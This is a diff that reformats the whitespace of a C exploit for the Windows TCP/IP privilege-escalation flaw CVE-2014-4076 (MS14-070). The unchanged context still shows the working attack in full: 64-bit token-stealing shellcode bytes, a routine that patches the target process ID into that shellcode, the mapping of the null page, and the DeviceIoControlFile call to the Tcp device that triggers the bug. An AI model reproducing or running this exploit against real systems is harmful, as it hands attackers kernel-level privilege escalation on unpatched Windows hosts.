@@ -10,9 +10,9 @@
 typedef void (WINAPI *DeviceIoControlFile)(HANDLE,HANDLE,PVOID,PVOID,PVOID,ULONG,PVOID,ULONG,PVOID,ULONG);
 typedef NTSTATUS (WINAPI *AllocateVirtualMemory) (HANDLE, PVOID, ULONG_PTR, PSIZE_T, ULONG, ULONG);
 
-#define INFO_CLASS_PROTOCOL			0x200;
+#define INFO_CLASS_PROTOCOL		0x200;
 #define INFO_TYPE_ADDRESS_OBJECT	0x200;
-#define AO_OPTION_WINDOW			0x22;
+#define AO_OPTION_WINDOW		0x22;
 
 typedef struct TDIEntityID {
 	unsigned long tei_entity;
@@ -35,23 +35,23 @@ typedef struct tcp_request_set_information_ex {
 //Shellcode is a quick 64 bit port of https://www.exploit-db.com/exploits/17902
 BYTE payload[] = 
 	"\x65\x48\x8b\x04\x25\x88\x01\x00\x00"	//mov rax,[gs:0x188]
-	"\x48\x8b\x40\x68"						//mov rax,[rax+0x68]
-	"\x48\xc7\xc3\x04\x00\x00\x00"			//mov rbx,4
-	"\x50"									//push rax
-	"\x48\x8b\x80\xe0\x00\x00\x00"			//mov rax,[rax+0xe0]
-	"\x48\x2d\xe0\x00\x00\x00"				//sub rax,0xe0
-	"\x39\x98\xd8\x00\x00\x00"				//cmp [rax+0xd8],ebx
-	"\x75\xeb"								//jne 15
-	"\x8b\xb8\x60\x01\x00\x00"				//mov edi,[rax+0x160]
-	"\x81\xe7\xf8\xff\xff\x0f"				//and edi,0x0ffffff8
-	"\x58"									//pop rax
-	"\x48\xc7\xc3\x00\x00\x00\x00"			//mov rbx,0xb80
-	"\x48\x8b\x80\xe0\x00\x00\x00"			//mov rax,[rax+0xe0]
-	"\x48\x2d\xe0\x00\x00\x00"				//sub rax,0xe0
-	"\x39\x98\xd8\x00\x00\x00"				//cmp [rax+0xd8],ebx
-	"\x75\xeb"								//jne 3e
-	"\x89\xb8\x60\x01\x00\x00"				//mov [rax+0x160],edi
-	"\xc3";									//ret
+	"\x48\x8b\x40\x68"			//mov rax,[rax+0x68]
+	"\x48\xc7\xc3\x04\x00\x00\x00"		//mov rbx,4
+	"\x50"					//push rax
+	"\x48\x8b\x80\xe0\x00\x00\x00"		//mov rax,[rax+0xe0]
+	"\x48\x2d\xe0\x00\x00\x00"		//sub rax,0xe0
+	"\x39\x98\xd8\x00\x00\x00"		//cmp [rax+0xd8],ebx
+	"\x75\xeb"				//jne 15
+	"\x8b\xb8\x60\x01\x00\x00"		//mov edi,[rax+0x160]
+	"\x81\xe7\xf8\xff\xff\x0f"		//and edi,0x0ffffff8
+	"\x58"					//pop rax
+	"\x48\xc7\xc3\x00\x00\x00\x00"		//mov rbx,0xb80
+	"\x48\x8b\x80\xe0\x00\x00\x00"		//mov rax,[rax+0xe0]
+	"\x48\x2d\xe0\x00\x00\x00"		//sub rax,0xe0
+	"\x39\x98\xd8\x00\x00\x00"		//cmp [rax+0xd8],ebx
+	"\x75\xeb"				//jne 3e
+	"\x89\xb8\x60\x01\x00\x00"		//mov [rax+0x160],edi
+	"\xc3";					//ret
 
 void patch_payload(DWORD pid) {
 	payload[58] = (BYTE)(DWORD) pid & 0x000000ff;
@@ -75,14 +75,14 @@ int trigger() {
 
 	if (!pDeviceIoControlFile) {
 		printf("[-] Failed to resolve ZwDeviceIoControlFile.\n" );
-        return -1;
-    }
+        	return -1;
+    	}
 
 	HANDLE hTCP = CreateFileA("\\\\.\\Tcp" ,FILE_SHARE_WRITE|FILE_SHARE_READ,0,NULL,OPEN_EXISTING,0,NULL);
-    if (!hTCP) {
+    	if (!hTCP) {
 		printf( "[-] Failed to open TCP device.\n" );
-        return -1;
-    }
+        	return -1;
+    	}
 
 	printf("[+] Triggering vulnerability.\n");
 	pDeviceIoControlFile(hTCP,NULL,NULL,NULL,&buf,0x00120028,&buf,sizeof(buf),0,0);
@@ -107,7 +107,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 
 	printf("CVE-2014-4076 / MS14-070\n");
 
-    AllocateVirtualMemory pAllocateVirtualMemory = (AllocateVirtualMemory) GetProcAddress(GetModuleHandle(TEXT("ntdll.dll" )),"ZwAllocateVirtualMemory");
+	AllocateVirtualMemory pAllocateVirtualMemory = (AllocateVirtualMemory) GetProcAddress(GetModuleHandle(TEXT("ntdll.dll" )),"ZwAllocateVirtualMemory");
 
 	if (!pAllocateVirtualMemory) {
 		printf("[-] Failed to resolve ZwAllocateVirtualMemory.");
@@ -119,7 +119,7 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	patch_payload(pid);
 
 	printf("[+] Mapping null page.\n");
-    pAllocateVirtualMemory((HANDLE)-1, &null_page, 0, &null_page_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    	pAllocateVirtualMemory((HANDLE)-1, &null_page, 0, &null_page_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
 	printf("[+] Mapping payload at %p.\n", sc);
 	pAllocateVirtualMemory((HANDLE)-1, &sc, 0, &sc_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
